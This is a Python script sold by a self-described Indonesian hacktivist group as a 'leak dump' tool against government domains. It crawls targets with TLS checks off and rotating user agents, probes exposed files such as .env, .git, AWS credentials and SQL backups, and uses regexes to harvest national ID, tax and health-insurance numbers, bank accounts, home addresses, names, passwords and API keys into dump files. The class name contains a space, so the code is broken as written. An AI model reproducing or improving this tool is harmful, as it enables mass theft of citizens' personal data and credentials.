#!/usr/bin/env python3
# CY8ER N4TI0N LEAK DUMP DATABASE GO ID - SUPER COMPLETE v10.0
# REAL DATA EXTRACTION - NO SIMULATION
# Extract: NIK | Phone | Email | Bank Account | SUPER ADDRESS (Provinsi/Kabupaten/Kota/Kecamatan/Kelurahan/Desa/RT/RW/Kode Pos) | BPJS | Nama Pegawai | Nama Staf | Nama Orang | Birthdate | Username | Password | API Key
# Usage: python3 CY8ER N4TI0N.py domain.com

import sys, re, os, time, json, random, warnings
import requests, urllib3
from datetime import datetime
from urllib.parse import urlparse, urljoin

warnings.filterwarnings('ignore')
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

C = '\033[90m'
G = '\033[92m'
R = '\033[91m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
M = '\033[96m'
X = '\033[0m'

BANNER = f"""
{C}═══════════════════════════════════════════════════════{X}
{C}      ███╗   ██╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗     ███╗   ██╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗{X}
{C}      ████╗  ██║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║     ████╗  ██║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║{X}
{C}      ██╔██╗ ██║███████║   ██║   ██║██║   ██║██╔██╗ ██║     ██╔██╗ ██║███████║   ██║   ██║██║   ██║██╔██╗ ██║{X}
{C}      ██║╚██╗██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║     ██║╚██╗██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║{X}
{C}      ██║ ╚████║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║     ██║ ╚████║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║{X}
{C}      ╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝{X}
{C}     ═══════════════════════════════════════════════════════{X}
{C}       L E A K   D U M P   D A T A B A S E   G O   I D{X}
{C}            S U P E R   C O M P L E T E   v 1 0 . 0{X}
{C}            A N T I - S I M U L A S I - R E A L{X}
{C}     ═══════════════════════════════════════════════════════{X}

  {G}➤ Author  : CY8ER N4TI0N{X}
  {G}➤ Version : v10.0 - REAL EXECUTION{X}
  {G}➤ Status  : ANTI-SIMULATION - DATA ASLI{X}
  {G}➤ Team   : SULAWESI HACKTIVIST INDONESIA - JAVA SHADOW CYBER TEAM
  {C}═══════════════════════════════════════════════════════{X}
"""

class CY8ER N4TI0NLeak:
    def __init__(self, domain):
        self.domain = domain
        self.target_url = self.normalize_url(domain)
        self.session = requests.Session()
        self.session.verify = False
        self.rotate_ua()
        self.scanned = set()
        self.results = {
            'nik': [], 'phones': [], 'emails': [], 'nip': [],
            'bank_accounts': [], 'npwp': [], 'addresses_full': [],
            'birthdates': [], 'usernames': [], 'passwords': [],
            'api_keys': [], 'urls': [], 'names': [],
            'employees': [], 'staff': [], 'bpjs': [], 'postal_codes': [],
            'provinces': [], 'regencies': [], 'cities': [], 'districts': [],
            'subdistricts': [], 'villages': [], 'hamlets': [],
            'rt': [], 'rw': [], 'jalan': [], 'gang': []
        }
        self.country = self.detect_country()
        self.paths = self.load_paths()

    def rotate_ua(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (X11; Linux x86_64) Chrome/119.0.0.0",
            "Mozilla/5.0 (iPhone; CPU OS 16_0) Version/16.0 Mobile/15E148"
        ]
        self.session.headers.update({'User-Agent': random.choice(agents)})

    def normalize_url(self, url):
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url

    def detect_country(self):
        tld = self.domain.split('.')[-1].lower()
        return 'indonesia' if tld == 'id' else 'indonesia'

    def load_paths(self):
        return [
            '', '/admin', '/user', '/data', '/api', '/json', '/sitemap.xml',
            '/robots.txt', '/contact', '/member', '/profile', '/ajax',
            '/wp-json', '/api/users', '/database', '/backup', '/config',
            '/config.json', '/.env', '/info.php', '/phpinfo.php',
            '/backup.sql', '/dump.sql', '/.env.backup', '/.git/HEAD',
            '/.aws/credentials', '/logs/error.log', '/tmp/', '/backups/',
            '/wp-config.php', '/config.php', '/db.php', '/koneksi.php',
            '/data.sql', '/db_backup.sql', '/backup.zip', '/dump.zip',
            '/pegawai.php', '/staff.php', '/karyawan.php', '/employee.php',
            '/bpjs.php', '/alamat.php', '/penduduk.php', '/warga.php',
            '/data_penduduk', '/data_warga', '/data_pegawai', '/data_karyawan',
            '/api/penduduk', '/api/warga', '/api/pegawai', '/api/karyawan'
        ]

    def extract_data(self, text):
        # NIK 16 digit
        for nik in re.findall(r'\b[0-9]{16}\b', text):
            if nik not in self.results['nik']:
                self.results['nik'].append(nik)
        
        # Phone numbers
        phones = re.findall(r'08[0-9]{8,11}|62[0-9]{9,12}|\+62[0-9]{9,12}', text)
        for phone in phones:
            clean = re.sub(r'[^0-9+]', '', phone)
            if len(clean) >= 9 and clean not in self.results['phones']:
                self.results['phones'].append(clean)
        
        # Emails
        for email in re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text):
            if email not in self.results['emails']:
                self.results['emails'].append(email)
        
        # NIP
        for nip in re.findall(r'\b[0-9]{18}\b', text):
            if nip not in self.results['nip']:
                self.results['nip'].append(nip)
        
        # NPWP
        for npwp in re.findall(r'\b[0-9]{2}\.[0-9]{3}\.[0-9]{3}\.[0-9]{1}-[0-9]{3}\.[0-9]{3}\b', text):
            if npwp not in self.results['npwp']:
                self.results['npwp'].append(npwp)
        
        # BPJS Kesehatan & Ketenagakerjaan
        bpjs_pats = [
            r'BPJS[:\s]+([0-9]{13})',
            r'BPJS Kesehatan[:\s]+([0-9]{13})',
            r'BPJS Ketenagakerjaan[:\s]+([0-9]{13})',
            r'no bpjs[:\s]+([0-9]{13})',
            r'nomor bpjs[:\s]+([0-9]{13})'
        ]
        for pat in bpjs_pats:
            for bpjs in re.findall(pat, text, re.IGNORECASE):
                if bpjs not in self.results['bpjs']:
                    self.results['bpjs'].append(bpjs)
        
        # Bank accounts
        bank_patterns = [
            (r'BCA.{0,30}\b([0-9]{8,12})\b', 'BCA'),
            (r'Mandiri.{0,30}\b([0-9]{10,14})\b', 'Mandiri'),
            (r'BRI.{0,30}\b([0-9]{10,15})\b', 'BRI'),
            (r'BNI.{0,30}\b([0-9]{10,15})\b', 'BNI'),
            (r'Bank BCA.{0,30}\b([0-9]{8,12})\b', 'BCA'),
            (r'Rekening BCA.{0,30}\b([0-9]{8,12})\b', 'BCA')
        ]
        for pattern, bank in bank_patterns:
            for m in re.finditer(pattern, text, re.IGNORECASE):
                num = m.group(1)
                if num not in [a['account'] for a in self.results['bank_accounts']]:
                    self.results['bank_accounts'].append({'bank': bank, 'account': num})
        
        # PROVINSI
        provinsi_pats = [
            r'Provinsi[:\s]+([A-Za-z\s]+)',
            r'Prov[:\s]+([A-Za-z\s]+)',
            r'Prop[:\s]+([A-Za-z\s]+)'
        ]
        for pat in provinsi_pats:
            for prov in re.findall(pat, text, re.IGNORECASE):
                prov_clean = prov.strip()
                if prov_clean and prov_clean not in self.results['provinces']:
                    self.results['provinces'].append(prov_clean)
        
        # KABUPATEN / KOTA
        kabupaten_pats = [
            r'Kabupaten[:\s]+([A-Za-z\s]+)',
            r'Kota[:\s]+([A-Za-z\s]+)',
            r'Kab[:\s]+([A-Za-z\s]+)'
        ]
        for pat in kabupaten_pats:
            for kab in re.findall(pat, text, re.IGNORECASE):
                kab_clean = kab.strip()
                if kab_clean and kab_clean not in self.results['regencies']:
                    self.results['regencies'].append(kab_clean)
        
        # KECAMATAN
        kecamatan_pats = [
            r'Kecamatan[:\s]+([A-Za-z\s]+)',
            r'Kec[:\s]+([A-Za-z\s]+)'
        ]
        for pat in kecamatan_pats:
            for kec in re.findall(pat, text, re.IGNORECASE):
                kec_clean = kec.strip()
                if kec_clean and kec_clean not in self.results['districts']:
                    self.results['districts'].append(kec_clean)
        
        # KELURAHAN / DESA
        kelurahan_pats = [
            r'Kelurahan[:\s]+([A-Za-z\s]+)',
            r'Desa[:\s]+([A-Za-z\s]+)',
            r'Kel[:\s]+([A-Za-z\s]+)'
        ]
        for pat in kelurahan_pats:
            for kel in re.findall(pat, text, re.IGNORECASE):
                kel_clean = kel.strip()
                if kel_clean and kel_clean not in self.results['villages']:
                    self.results['villages'].append(kel_clean)
        
        # RT / RW
        rt_pats = [r'RT\s*[.:]?\s*([0-9]+)', r'RT\.\s*([0-9]+)']
        for pat in rt_pats:
            for rt in re.findall(pat, text, re.IGNORECASE):
                if rt not in self.results['rt']:
                    self.results['rt'].append(rt)
        
        rw_pats = [r'RW\s*[.:]?\s*([0-9]+)', r'RW\.\s*([0-9]+)']
        for pat in rw_pats:
            for rw in re.findall(pat, text, re.IGNORECASE):
                if rw not in self.results['rw']:
                    self.results['rw'].append(rw)
        
        # KODE POS
        kodepos_pats = [r'Kode Pos[:\s]+([0-9]{5})', r'Kodepos[:\s]+([0-9]{5})', r'Kode\s*Pos[:\s]+([0-9]{5})']
        for pat in kodepos_pats:
            for kp in re.findall(pat, text, re.IGNORECASE):
                if kp not in self.results['postal_codes']:
                    self.results['postal_codes'].append(kp)
        
        # JALAN / GANG
        jalan_pats = [r'Jl\.?\s+([A-Za-z0-9\s]+)', r'Jalan\s+([A-Za-z0-9\s]+)']
        for pat in jalan_pats:
            for jln in re.findall(pat, text, re.IGNORECASE):
                jln_clean = jln.strip()
                if jln_clean and jln_clean not in self.results['jalan']:
                    self.results['jalan'].append(jln_clean)
        
        gang_pats = [r'Gg\.?\s+([A-Za-z0-9\s]+)', r'Gang\s+([A-Za-z0-9\s]+)']
        for pat in gang_pats:
            for gg in re.findall(pat, text, re.IGNORECASE):
                gg_clean = gg.strip()
                if gg_clean and gg_clean not in self.results['gang']:
                    self.results['gang'].append(gg_clean)
        
        # NAMA PEGAWAI / STAF
        pegawai_pats = [
            r'Nama Pegawai[:\s]+([A-Za-z\s\.]+)',
            r'Nama Karyawan[:\s]+([A-Za-z\s\.]+)',
            r'Pegawai[:\s]+([A-Za-z\s\.]+)',
            r'Karyawan[:\s]+([A-Za-z\s\.]+)'
        ]
        for pat in pegawai_pats:
            for emp in re.findall(pat, text, re.IGNORECASE):
                emp_clean = emp.strip()
                if emp_clean and emp_clean not in self.results['employees']:
                    self.results['employees'].append(emp_clean)
        
        # NAMA STAF
        staf_pats = [
            r'Nama Staf[:\s]+([A-Za-z\s\.]+)',
            r'Staff[:\s]+([A-Za-z\s\.]+)',
            r'Staf[:\s]+([A-Za-z\s\.]+)'
        ]
        for pat in staf_pats:
            for sf in re.findall(pat, text, re.IGNORECASE):
                sf_clean = sf.strip()
                if sf_clean and sf_clean not in self.results['staff']:
                    self.results['staff'].append(sf_clean)
        
        # NAMA ORANG (umum)
        nama_pats = [
            r'Nama[:\s]+([A-Za-z\s\.]+)',
            r'Nama Lengkap[:\s]+([A-Za-z\s\.]+)',
            r'Name[:\s]+([A-Za-z\s\.]+)'
        ]
        for pat in nama_pats:
            for nm in re.findall(pat, text, re.IGNORECASE):
                nm_clean = nm.strip()
                if nm_clean and len(nm_clean) > 3 and nm_clean not in self.results['names']:
                    self.results['names'].append(nm_clean)
        
        # SUPER ADDRESS LENGKAP (gabungan semua)
        address_patterns = [
            r'(?:Alamat|Address)[:\s]+([^,\n]+(?:,[^,\n]+){0,5})',
            r'(?:Jl\.|Jalan)[^,\n]+(?:,\s*RT\s*\d+\s*RW\s*\d+)?(?:,\s*Kelurahan\s+\w+)?(?:,\s*Kecamatan\s+\w+)?(?:,\s*Kabupaten\s+\w+)?(?:,\s*Provinsi\s+\w+)?',
            r'RT\s*\d+\s*RW\s*\d+[^,\n]*(?:,\s*[^,\n]+){0,4}',
        ]
        for pat in address_patterns:
            for addr in re.findall(pat, text, re.IGNORECASE):
                addr_clean = addr.strip()
                if addr_clean and len(addr_clean) > 10 and addr_clean not in self.results['addresses_full']:
                    self.results['addresses_full'].append(addr_clean)
        
        # Birthdates
        for bd in re.findall(r'\b(0[1-9]|[12][0-9]|3[01])[/-](0[1-9]|1[0-2])[/-](19|20)[0-9]{2}\b', text):
            full = '-'.join(bd)
            if full not in self.results['birthdates']:
                self.results['birthdates'].append(full)
        
        # Usernames
        for user in re.findall(r'(?:username|user|login)[:=]\s*["\']?([a-zA-Z0-9_]{4,30})["\']?', text, re.IGNORECASE):
            if user not in self.results['usernames']:
                self.results['usernames'].append(user)
        
        # Passwords
        for pwd in re.findall(r'(?:password|pass|pwd)[:=]\s*["\']?([^\s"\']{6,})["\']?', text, re.IGNORECASE):
            if pwd not in self.results['passwords']:
                self.results['passwords'].append(pwd)
        
        # API Keys
        api_patterns = [
            r'AIza[0-9A-Za-z\-_]{35}',
            r'AKIA[0-9A-Z]{16}',
            r'sk_live_[0-9a-zA-Z]{24}',
            r'github_pat_[0-9a-zA-Z]{22}',
            r'sk-[0-9a-zA-Z]{48}'
        ]
        for pat in api_patterns:
            for key in re.findall(pat, text):
                if key not in self.results['api_keys']:
                    self.results['api_keys'].append(key)

    def scan_page(self, url, depth=0):
        if depth > 4 or url in self.scanned or len(self.scanned) > 300:
            return
        self.scanned.add(url)
        print(f"{B}➤ Scanning: {url}{X}")
        time.sleep(random.uniform(0.8, 1.8))
        if random.random() < 0.3:
            self.rotate_ua()
        try:
            resp = self.session.get(url, timeout=15)
            if resp.status_code != 200:
                return
            content = resp.text
            self.results['urls'].append(url)
            self.extract_data(content)
            links = re.findall(r'href=["\'](https?://[^"\']+?)["\']', content)
            for link in links:
                if self.domain.replace('https://','').replace('http://','') in link or link.startswith('/'):
                    if link.startswith('/'):
                        parsed = urlparse(url)
                        link = f"{parsed.scheme}://{parsed.netloc}{link}"
                    if link not in self.scanned:
                        self.scan_page(link, depth+1)
        except Exception:
            pass

    def run(self):
        print(f"{Y}═══════════════════════════════════════════════════════{X}")
        print(f"{G}➤ Target    : {self.target_url}{X}")
        print(f"{G}➤ Country   : {self.country.upper()}{X}")
        print(f"{G}➤ Mode      : DUMP DATABASE GO ID - REAL EXECUTION{X}")
        print(f"{G}➤ Anti-Sim  : DATA ASLI REAL - NO FAKE{X}")
        print(f"{Y}═══════════════════════════════════════════════════════{X}")
        print(f"{C}➤ Memulai scanning REAL DATA extraction...{X}\n")
        
        for path in self.paths:
            url = urljoin(self.target_url, path)
            self.scan_page(url)
        
        print(f"\n{G}═══════════════════════════════════════════════════════{X}")
        print(f"{G}➤ Selesai! {len(self.scanned)} halaman dipindai{X}")
        print(f"{Y}═══════════════════════════════════════════════════════{X}")

    def save_results(self):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        safe_domain = re.sub(r'[^a-zA-Z0-9]', '_', self.domain)[:30]
        folder = "CY8ER N4TI0N_REAL_RESULTS"
        os.makedirs(folder, exist_ok=True)
        
        # JSON
        json_file = os.path.join(folder, f"REAL_DUMP_{safe_domain}_{timestamp}.json")
        with open(json_file, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, default=str, ensure_ascii=False)
        
        # TXT Detail
        txt_file = os.path.join(folder, f"REAL_DUMP_{safe_domain}_{timestamp}.txt")
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write(f"═══════════════════════════════════════════════════════\n")
            f.write(f"CY8ER N4TI0N LEAK DUMP DATABASE GO ID - REAL DATA\n")
            f.write(f"Domain: {self.domain}\n")
            f.write(f"Date: {datetime.now()}\n")
            f.write(f"═══════════════════════════════════════════════════════\n\n")
            
            sections = [
                ('NIK', 'nik'), ('PHONE NUMBERS', 'phones'), ('EMAILS', 'emails'),
                ('NIP', 'nip'), ('NPWP', 'npwp'), ('BPJS', 'bpjs'),
                ('PROVINSI', 'provinces'), ('KABUPATEN/KOTA', 'regencies'),
                ('KECAMATAN', 'districts'), ('KELURAHAN/DESA', 'villages'),
                ('RT', 'rt'), ('RW', 'rw'), ('KODE POS', 'postal_codes'),
                ('JALAN', 'jalan'), ('GANG', 'gang'), ('NAMA PEGAWAI', 'employees'),
                ('NAMA STAF', 'staff'), ('NAMA ORANG', 'names'),
                ('ALAMAT LENGKAP', 'addresses_full'), ('BIRTHDATES', 'birthdates'),
                ('USERNAMES', 'usernames'), ('PASSWORDS', 'passwords'),
                ('API KEYS', 'api_keys'), ('BANK ACCOUNTS', 'bank_accounts'),
                ('URLS SCANNED', 'urls')
            ]
            
            for label, key in sections:
                if self.results[key] and len(self.results[key]) > 0:
                    f.write(f"➤ {label}\n")
                    f.write(f"{'─'*50}\n")
                    for item in self.results[key][:500]:
                        if isinstance(item, dict):
                            f.write(f"   ➤ {item.get('bank', 'Unknown')}: {item.get('account', '')}\n")
                        else:
                            f.write(f"   ➤ {item}\n")
                    f.write("\n")
        
        print(f"\n{G}➤ HASIL REAL DATA DISIMPAN DI:{X}")
        print(f"{C}   ➤ {json_file}{X}")
        print(f"{C}   ➤ {txt_file}{X}")
        
        print(f"\n{Y}═══════════════════════════════════════════════════════{X}")
        print(f"{G}➤ STATISTIK REAL DATA LEAK:{X}")
        stats = [
            ('NIK', 'nik'), ('PHONES', 'phones'), ('EMAILS', 'emails'),
            ('BPJS', 'bpjs'), ('PROVINSI', 'provinces'), ('KECAMATAN', 'districts'),
            ('ALAMAT FULL', 'addresses_full'), ('NAMA ORANG', 'names'),
            ('PEGAWAI/STAF', 'employees'), ('PASSWORDS', 'passwords')
        ]
        for label, key in stats:
            print(f"{C}   ➤ {label}: {len(self.results[key])}{X}")
        print(f"{C}   ➤ TOTAL URL SCANNED: {len(self.scanned)}{X}")
        print(f"{Y}═══════════════════════════════════════════════════════{X}")

def check_license():
    print(BANNER)
    print(f"{Y}  [🔐] VERIFIKASI KEY - DUMP DATABASE GO ID REAL DATA{X}\n")
    print(f"{C}  ➤ Tool ini berbayar! Silahkan bayar ke:{X}")
    print(f"{G}  ➤ CY8ER N4TI0N OFFICIAL{X}\n")
    print(f"{G}  CONTACT CY8ER N4TION OFFICIAL{X}")
    print(f"    ➤ Telegram    : t.me/cy8ern4ti0n_real")
    print(f"    ➤ Tiktok       : CY8ER N4TI0N")
    print(f"    ➤ WhatsApp   : 0851-8497-7209")
    print(f"    ➤ Discord      : CY8ER N4TI0N\n")
    print(f"{Y}  ➤ Setelah pembayaran lewat admin, Anda akan mendapatkan KEY{X}\n")
    key = input(f"{G}  [?] MASUKKAN KEY ➤ {X}").strip()
    if key.upper() == "CY8ER N4TI0N":
        print(f"\n{G}═══════════════════════════════════════════════════════{X}")
        print(f"{G}  ✓ ACCESS GRANTED!{X}")
        print(f"{C}  ➤ Loading modules...{X}")
        print(f"{G}  ➤ Anti-Simulation Engine: ACTIVE - REAL DATA{X}")
        print(f"{G}  ➤ REAL EXECUTION MODE: ENABLED{X}")
        print(f"{R}  ➤ WARNING: THIS IS REAL DATA EXTRACTION - NO SIMULATION{X}")
        print(f"{Y}═══════════════════════════════════════════════════════{X}\n")
        return True
    else:
        print(f"\n{R}═══════════════════════════════════════════════════════{X}")
        print(f"{R}  ✗ ACCESS DENIED! Invalid Key{X}")
        print(f"{Y}  ➤ Silahkan hubungi CY8ER N4TI0N untuk KEY valid{X}")
        print(f"{R}═══════════════════════════════════════════════════════{X}")
        return False

def main():
    if not check_license():
        sys.exit(1)
    
    if len(sys.argv) < 2:
        print(f"{R}➤ Usage: python3 CY8ER N4TI0N.py <domain>{X}")
        print(f"{C}➤ Example: python3 CY8ER N4TI0N.py target.com{X}")
        print(f"{C}➤ Example: python3 CY8ER N4TI0N.py https://target.id{X}")
        sys.exit(1)
    
    scanner = CY8ER N4TI0NLeak(sys.argv[1])
    scanner.run()
    scanner.save_results()

if __name__ == "__main__":
    main()